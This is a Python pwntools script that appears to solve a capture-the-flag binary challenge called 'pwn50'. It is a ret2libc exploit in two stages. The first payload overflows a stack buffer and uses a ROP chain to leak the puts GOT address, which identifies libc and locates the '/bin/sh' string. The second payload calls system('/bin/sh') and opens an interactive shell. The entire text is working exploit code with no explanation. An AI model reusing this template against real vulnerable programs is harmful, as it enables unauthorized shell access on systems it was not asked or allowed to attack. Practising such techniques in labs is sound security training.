from pwn import *
from LibcSearcher import LibcSearcher
context.log_level = "debug"
p = process("./pwn50")
elf = ELF("./pwn50")

p.recvuntil("easy?\n")



# leak puts_addr to get libc_addr
vuln_sym = 0x08048534
puts_plt = elf.plt["puts"]
puts_got = elf.got["puts"]
p_ebx_r = 0x0804839d

payload = 0x14 * "a" + 0x4 * "a" + p32(puts_plt) + p32(p_ebx_r) + p32(puts_got) + p32(vuln_sym)
p.sendline(payload)

p.recvuntil("\n")
puts_addr = u32(p.recvuntil("\n")[:4])
log.success("puts : " + hex(puts_addr))
libc = LibcSearcher("puts" , puts_addr)
libc_base = puts_addr - libc.dump("puts")
str_bin_sh = libc_base + libc.dump("str_bin_sh")

system_plt = elf.plt["system"]
payload2 = 0x14 * "a" + 0x4 * "a" + p32(system_plt) + p32(vuln_sym) + p32(str_bin_sh)
p.sendline(payload2)
p.recv()
p.interactive()